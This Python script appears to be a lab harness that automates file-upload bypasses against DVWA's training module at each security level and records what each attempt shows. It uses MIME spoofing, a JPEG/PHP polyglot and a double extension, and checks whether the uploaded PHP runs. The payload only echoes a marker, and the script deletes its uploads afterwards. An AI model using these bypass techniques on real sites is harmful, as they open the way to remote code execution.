#!/usr/bin/env python3
import argparse
import hashlib
import json
import re
import shutil
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


TZ = timezone(timedelta(hours=8))
DIFFICULTIES = ["low", "medium", "high", "impossible"]
MODULE_ROUTE = "vulnerabilities/upload/"
MARKER = b"DVWA_UPLOAD_PROOF_20260608"
PHP_PAYLOAD = b'<?php echo "DVWA_UPLOAD_PROOF_20260608"; ?>'


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def page_text(html):
    return " ".join(BeautifulSoup(html, "html.parser").get_text(" ").split())


def extract_token(html):
    soup = BeautifulSoup(html, "html.parser")
    field = soup.find("input", {"name": "user_token"})
    return field.get("value") if field else None


def extract_form(html):
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        return {"method": None, "action": None, "enctype": None, "fields": []}
    fields = []
    for element in form.find_all("input"):
        fields.append(
            {
                "name": element.get("name"),
                "type": element.get("type"),
                "value": element.get("value"),
            }
        )
    return {
        "method": form.get("method", "GET").upper(),
        "action": form.get("action", "#"),
        "enctype": form.get("enctype"),
        "fields": fields,
    }


def marker_context(text, marker):
    index = text.find(marker)
    if index < 0:
        return ""
    start = max(0, index - 90)
    end = min(len(text), index + len(marker) + 190)
    return text[start:end]


def classify_upload_response(html):
    text = page_text(html)
    markers = []
    contexts = {}
    marker_map = {
        "upload_success": "succesfully uploaded!",
        "upload_failed": "Your image was not uploaded.",
        "jpeg_png_only": "We can only accept JPEG or PNG images.",
        "csrf_text": "CSRF",
    }
    for name, marker in marker_map.items():
        if marker in text:
            markers.append(name)
            contexts[name] = marker_context(text, marker)
    if not markers:
        markers.append("no_known_marker")
    return markers, contexts, text


def parse_uploaded_path(text):
    match = re.search(r"(\.\./\.\./hackable/uploads/[^\s<>]+|[a-f0-9]{32}\.(?:jpg|jpeg|png))\s+succesfully uploaded!", text)
    return match.group(1) if match else None


def safe_name(value):
    return "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in value)


class Harness:
    def __init__(self, base_url, dvwa_user, dvwa_password, source_path, out_dir, proxy=None):
        self.base_url = base_url if base_url.endswith("/") else base_url + "/"
        self.dvwa_user = dvwa_user
        self.dvwa_password = dvwa_password
        self.source_path = Path(source_path)
        self.upload_dir = self.source_path / "hackable" / "uploads"
        self.out_dir = Path(out_dir)
        self.requests_dir = self.out_dir / "requests"
        self.payload_dir = self.out_dir / "payloads"
        self.log_path = self.out_dir / "operation-log.jsonl"
        self.json_path = self.out_dir / "report.json"
        self.session = requests.Session()
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.started = time.perf_counter()
        self.results = []
        self.total_requests = 0
        self.created_files = []

    def log(self, difficulty, tool, action, input_summary, output_summary, duration_s=None, evidence_path=None):
        entry = {
            "ts": now_iso(),
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "difficulty": difficulty,
            "tool": tool,
            "action": action,
            "input_summary": input_summary,
            "output_summary": output_summary,
            "duration_s": round(duration_s, 3) if duration_s is not None else None,
            "evidence_path": evidence_path,
        }
        with self.log_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def request(self, method, route, difficulty, label, **kwargs):
        start = time.perf_counter()
        resp = self.session.request(
            method,
            urljoin(self.base_url, route),
            proxies=self.proxies,
            allow_redirects=True,
            timeout=30,
            **kwargs,
        )
        duration = time.perf_counter() - start
        self.total_requests += 1
        evidence = {
            "method": method,
            "url": resp.url,
            "status_code": resp.status_code,
            "elapsed_s": round(duration, 3),
            "response_len": len(resp.content),
        }
        path = self.requests_dir / f"{safe_name(difficulty)}-{safe_name(label)}.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(difficulty, "python-requests", label, f"{method} {route}", f"status={resp.status_code} elapsed={duration:.3f}s", duration, str(path.relative_to(self.out_dir)))
        return resp, evidence, path

    def get(self, route, difficulty, label, **kwargs):
        return self.request("GET", route, difficulty, label, **kwargs)

    def post(self, route, difficulty, label, **kwargs):
        return self.request("POST", route, difficulty, label, **kwargs)

    def write_evidence(self, difficulty, label, evidence):
        path = self.requests_dir / f"{safe_name(difficulty)}-{safe_name(label)}.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        return path

    def login(self):
        resp, _, _ = self.get("login.php", "setup", "fetch-login-form")
        data = {
            "username": self.dvwa_user,
            "password": self.dvwa_password,
            "Login": "Login",
            "user_token": extract_token(resp.text),
        }
        resp, _, _ = self.post("login.php", "setup", "submit-dvwa-login", data=data)
        authenticated = "Logout" in resp.text or "Damn Vulnerable Web Application" in resp.text
        self.log("setup", "auth", "login-result", "DVWA credentials supplied by user", f"authenticated={authenticated}")
        if not authenticated:
            raise RuntimeError("DVWA login did not produce an authenticated page")

    def set_security(self, difficulty):
        resp, _, _ = self.get("security.php", difficulty, "fetch-security-form")
        data = {"security": difficulty, "seclev_submit": "Submit", "user_token": extract_token(resp.text)}
        self.post("security.php", difficulty, "set-security", data=data)
        cookie_level = self.session.cookies.get("security")
        self.log(difficulty, "dvwa", "security-cookie", f"requested={difficulty}", f"cookie={cookie_level}")

    def inspect_module(self, difficulty):
        resp, evidence, _ = self.get(MODULE_ROUTE, difficulty, "inspect-module-form")
        form = extract_form(resp.text)
        evidence.update({
            "form": form,
            "security_cookie": self.session.cookies.get("security"),
            "snippet": page_text(resp.text)[:700],
        })
        path = self.write_evidence(difficulty, "inspect-module-form", evidence)
        self.log(difficulty, "html-parser", "form-model", "upload form", json.dumps(form, ensure_ascii=False), evidence_path=str(path.relative_to(self.out_dir)))
        return form, resp.text

    def source_metadata(self, difficulty):
        source_file = self.source_path / "vulnerabilities" / "upload" / "source" / f"{difficulty}.php"
        data = source_file.read_bytes()
        meta = {
            "path": str(source_file),
            "size_bytes": source_file.stat().st_size,
            "sha256": hashlib.sha256(data).hexdigest(),
            "mtime": datetime.fromtimestamp(source_file.stat().st_mtime, TZ).isoformat(timespec="seconds"),
        }
        self.log(difficulty, "source-review", f"read {difficulty}.php", str(source_file), f"sha256={meta['sha256'][:16]}")
        return meta

    def prepare_payloads(self):
        self.payload_dir.mkdir(parents=True, exist_ok=True)
        php_path = self.payload_dir / "dvwa_upload_echo_20260608.php"
        php_path.write_bytes(PHP_PAYLOAD)
        image_path = self.source_path / "hackable" / "users" / "admin.jpg"
        jpg = image_path.read_bytes()
        image_copy = self.payload_dir / "dvwa_upload_valid_20260608.jpg"
        image_copy.write_bytes(jpg)
        poly_path = self.payload_dir / "dvwa_upload_polyglot_20260608.php.jpg"
        poly_path.write_bytes(jpg + b"\n" + PHP_PAYLOAD + b"\n")
        self.log("setup", "payload-generator", "write-payloads", str(self.payload_dir), "php echo marker, valid jpg copy, jpg+php marker")
        return {
            "php": php_path,
            "jpg": image_copy,
            "polyglot": poly_path,
        }

    def fresh_token_data(self, difficulty):
        resp, _, _ = self.get(MODULE_ROUTE, difficulty, "fetch-upload-form-for-token")
        data = {"Upload": "Upload"}
        token = extract_token(resp.text)
        if token:
            data["user_token"] = token
        return data

    def upload_file(self, difficulty, label, filepath, upload_name, content_type):
        data = self.fresh_token_data(difficulty)
        with open(filepath, "rb") as fh:
            files = {"uploaded": (upload_name, fh, content_type)}
            resp, evidence, _ = self.post(MODULE_ROUTE, difficulty, label, data=data, files=files)
        markers, contexts, text = classify_upload_response(resp.text)
        uploaded_path = parse_uploaded_path(text)
        access_url = None
        filesystem_path = None
        if uploaded_path:
            if uploaded_path.startswith("../../"):
                relative = uploaded_path.replace("../../", "")
                access_url = urljoin(self.base_url, relative)
                filesystem_path = self.source_path / relative.replace("/", "\\")
            else:
                access_url = urljoin(self.base_url, "hackable/uploads/" + uploaded_path)
                filesystem_path = self.upload_dir / uploaded_path
            self.created_files.append(Path(filesystem_path))
        evidence.update({
            "request_fields": {"Upload": "Upload", "user_token_present": "user_token" in data},
            "filename": upload_name,
            "content_type": content_type,
            "payload_path": str(filepath),
            "markers": markers,
            "marker_contexts": contexts,
            "uploaded_path": uploaded_path,
            "access_url": access_url,
            "filesystem_path": str(filesystem_path) if filesystem_path else None,
            "snippet": text[:900],
        })
        path = self.write_evidence(difficulty, label, evidence)
        self.log(difficulty, "upload", label, f"{upload_name} type={content_type}", f"markers={markers} uploaded_path={uploaded_path}", evidence_path=str(path.relative_to(self.out_dir)))
        return evidence

    def access_uploaded(self, difficulty, label, access_url):
        start = time.perf_counter()
        resp = self.session.get(access_url, proxies=self.proxies, timeout=20)
        duration = time.perf_counter() - start
        self.total_requests += 1
        content = resp.content
        marker_present = MARKER in content
        php_tag_present = b"<?php" in content
        executed_echo_only = marker_present and not php_tag_present and resp.headers.get("content-type", "").startswith("text/html")
        evidence = {
            "method": "GET",
            "url": access_url,
            "status_code": resp.status_code,
            "elapsed_s": round(duration, 3),
            "content_type": resp.headers.get("content-type"),
            "response_len": len(content),
            "marker_present": marker_present,
            "php_tag_present": php_tag_present,
            "executed_echo_only": executed_echo_only,
            "first_bytes_hex": content[:32].hex(),
            "text_preview": content[:300].decode("latin-1", errors="replace"),
        }
        path = self.write_evidence(difficulty, label, evidence)
        self.log(difficulty, "python-requests", label, "GET uploaded file", f"marker={marker_present} php_tag={php_tag_present} executed={executed_echo_only}", duration, str(path.relative_to(self.out_dir)))
        return evidence

    def cleanup_created(self, difficulty):
        records = []
        for path in list(dict.fromkeys(self.created_files)):
            if not str(path).lower().startswith(str(self.upload_dir).lower()):
                records.append({"path": str(path), "deleted": False, "reason": "outside upload dir guard"})
                continue
            existed_before = path.exists()
            deleted = False
            error = None
            if existed_before:
                try:
                    path.unlink()
                    deleted = True
                except Exception as exc:
                    error = str(exc)
            records.append({"path": str(path), "existed_before_cleanup": existed_before, "deleted": deleted, "error": error})
        self.created_files.clear()
        evidence = {"cleanup": records}
        path = self.write_evidence(difficulty, "cleanup", evidence)
        self.log(difficulty, "cleanup", "delete-uploaded-proof-files", str(self.upload_dir), json.dumps(records, ensure_ascii=False), evidence_path=str(path.relative_to(self.out_dir)))
        return records

    def run_level(self, difficulty, payloads):
        level_start = time.perf_counter()
        requests_before = self.total_requests
        self.set_security(difficulty)
        form, _ = self.inspect_module(difficulty)
        source = self.source_metadata(difficulty)
        attempts = []
        access_checks = []
        status = "not_run"
        stop_reason = ""
        proof = None

        if difficulty == "low":
            plan = [
                ("upload-php-echo", payloads["php"], "dvwa_upload_low_20260608.php", "application/x-php", "php_execution_proof"),
            ]
        elif difficulty == "medium":
            plan = [
                ("blocked-php-text-plain", payloads["php"], "dvwa_upload_medium_plain_20260608.php", "text/plain", "blocked_probe"),
                ("upload-php-echo-as-jpeg", payloads["php"], "dvwa_upload_medium_20260608.php", "image/jpeg", "php_execution_proof"),
            ]
        elif difficulty == "high":
            plan = [
                ("blocked-php-extension", payloads["php"], "dvwa_upload_high_20260608.php", "image/jpeg", "blocked_probe"),
                ("blocked-jpg-extension-invalid-image", payloads["php"], "dvwa_upload_high_invalid_20260608.jpg", "image/jpeg", "blocked_probe"),
                ("upload-polyglot-double-extension", payloads["polyglot"], "dvwa_upload_high_20260608.php.jpg", "image/jpeg", "stored_polyglot_probe"),
            ]
        else:
            plan = [
                ("blocked-php-extension", payloads["php"], "dvwa_upload_impossible_20260608.php", "image/jpeg", "blocked_probe"),
                ("upload-polyglot-reencoded", payloads["polyglot"], "dvwa_upload_impossible_20260608.php.jpg", "image/jpeg", "defense_probe"),
            ]

        self.log(difficulty, "test-plan", "generated-upload-probes", "source-derived upload probes", json.dumps([(p[0], p[2], p[3], p[4]) for p in plan], ensure_ascii=False))

        for label, filepath, upload_name, content_type, purpose in plan:
            evidence = self.upload_file(difficulty, label, filepath, upload_name, content_type)
            evidence["purpose"] = purpose
            attempts.append(evidence)
            if evidence.get("access_url"):
                access = self.access_uploaded(difficulty, "access-" + label, evidence["access_url"])
                access["purpose"] = purpose
                access["uploaded_path"] = evidence.get("uploaded_path")
                access_checks.append(access)

        if difficulty in ("low", "medium"):
            success = next((a for a in access_checks if a["executed_echo_only"]), None)
            if success:
                status = "solved_vulnerable_php_execution"
                proof = {"access_url": success["url"], "marker": MARKER.decode(), "executed_echo_only": True}
                stop_reason = "uploaded .php returned echo marker without PHP source tag"
            else:
                status = "inconclusive"
                stop_reason = "expected PHP echo marker execution was not observed"
        elif difficulty == "high":
            poly = next((a for a in access_checks if a["purpose"] == "stored_polyglot_probe"), None)
            if poly and poly["marker_present"] and poly["php_tag_present"] and not poly["executed_echo_only"]:
                status = "limited_vulnerable_stored_polyglot_no_php_execution"
                proof = {"access_url": poly["url"], "marker_present": True, "php_tag_present": True, "executed_echo_only": False}
                stop_reason = "polyglot .php.jpg stored in web-accessible path, but PHP was not executed on direct access"
            else:
                status = "blocked"
                stop_reason = "high checks prevented PHP marker upload/access proof"
        else:
            reencoded = next((a for a in access_checks if a["purpose"] == "defense_probe"), None)
            rejected_php = next((a for a in attempts if a["purpose"] == "blocked_probe" and "upload_failed" in a["markers"]), None)
            if rejected_php and reencoded and not reencoded["marker_present"] and not reencoded["php_tag_present"]:
                status = "defended_not_vulnerable"
                proof = {"reencoded_access_url": reencoded["url"], "marker_present": False, "php_tag_present": False}
                stop_reason = "extension/MIME/image validation plus re-encoding stripped PHP marker and randomized filename"
            else:
                status = "inconclusive"
                stop_reason = "impossible defense evidence did not match expected rejection/re-encoding pattern"

        cleanup = self.cleanup_created(difficulty)
        elapsed = time.perf_counter() - level_start
        result = {
            "difficulty": difficulty,
            "status": status,
            "stop_reason": stop_reason,
            "proof": proof,
            "form": form,
            "source": source,
            "attempts": attempts,
            "access_checks": access_checks,
            "cleanup": cleanup,
            "request_count": self.total_requests - requests_before,
            "level_elapsed_s": round(elapsed, 3),
        }
        self.results.append(result)
        self.log(difficulty, "harness", "level-conclusion", difficulty, f"{status}; {stop_reason}", elapsed)
        return result

    def run(self):
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.requests_dir.mkdir(parents=True, exist_ok=True)
        self.payload_dir.mkdir(parents=True, exist_ok=True)
        if self.log_path.exists():
            self.log_path.unlink()
        run_started = now_iso()
        payloads = self.prepare_payloads()
        self.login()
        stop_after = None
        for difficulty in DIFFICULTIES:
            result = self.run_level(difficulty, payloads)
            if result["status"] in ("defended_not_vulnerable", "blocked", "inconclusive"):
                stop_after = difficulty
                break
        run_finished = now_iso()
        payload = {
            "target": self.base_url,
            "module": "File Upload",
            "run_started": run_started,
            "run_finished": run_finished,
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "stop_after": stop_after,
            "total_requests": self.total_requests,
            "results": self.results,
            "operation_log": str(self.log_path),
        }
        self.json_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        print(json.dumps(payload, ensure_ascii=False, indent=2))


def main():
    parser = argparse.ArgumentParser(description="DVWA File Upload progression harness generated from live page/source inspection.")
    parser.add_argument("--base-url", default="http://127.0.0.1/dvwa/")
    parser.add_argument("--dvwa-user", default="admin")
    parser.add_argument("--dvwa-password", default="password")
    parser.add_argument("--source-path", default=r"D:\phpStudy\PHPTutorial\WWW\DVWA")
    parser.add_argument("--out-dir", required=True)
    parser.add_argument("--proxy", default=None)
    args = parser.parse_args()
    Harness(args.base_url, args.dvwa_user, args.dvwa_password, args.source_path, args.out_dir, args.proxy).run()


if __name__ == "__main__":
    main()
